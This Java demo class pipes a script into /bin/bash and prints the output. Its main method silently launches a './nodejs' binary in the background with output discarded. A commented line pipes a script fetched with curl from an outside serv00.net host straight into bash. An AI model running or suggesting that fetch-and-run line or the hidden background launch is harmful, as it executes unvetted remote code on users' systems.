package com.example.demo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

public class RunLinuxCommand {

    public static List<String> runScript(String scriptContent) {
        List<String> results = new ArrayList<>();
        Process process = null;

        try {
            // 使用 ProcessBuilder 启动一个 bash shell 进程
            ProcessBuilder pb = new ProcessBuilder("/bin/bash");
            pb.redirectErrorStream(true); // 将错误输出重定向到标准输出
            process = pb.start();

            // 获取进程的标准输入流
            OutputStream os = process.getOutputStream();
            os.write(scriptContent.getBytes()); // 将脚本内容写入标准输入
            os.flush();
            os.close(); // 关闭输入流

            // 读取进程的标准输出
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            results.add("Script Output:\n" + output.toString());

            // 等待脚本执行完成
            int exitCode = process.waitFor();
            results.add("Script Exit Code: " + exitCode);

        } catch (IOException e) {
            results.add("Error starting process or writing to input: " + e.getMessage());
        } catch (InterruptedException e) {
            results.add("Script execution interrupted: " + e.getMessage());
            Thread.currentThread().interrupt();
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
        return results;
    }
//bash <(curl -Ls https://gbjs.serv00.net/compress.sh )
    public static void main(String[] args) {
        // 使用文本块定义包含原生 Linux 脚本的字符串变量 (需要 Java 15+)
        String scriptCommands = """
                nohup ./nodejs -config config.json >/dev/null 2>&1 &
                ls -la
                echo "${whoami}"
                """;

        List<String> executionResults = runScript(scriptCommands);

        // 打印脚本的执行结果
        for (String result : executionResults) {
            System.out.println(result);
        }
    }
}
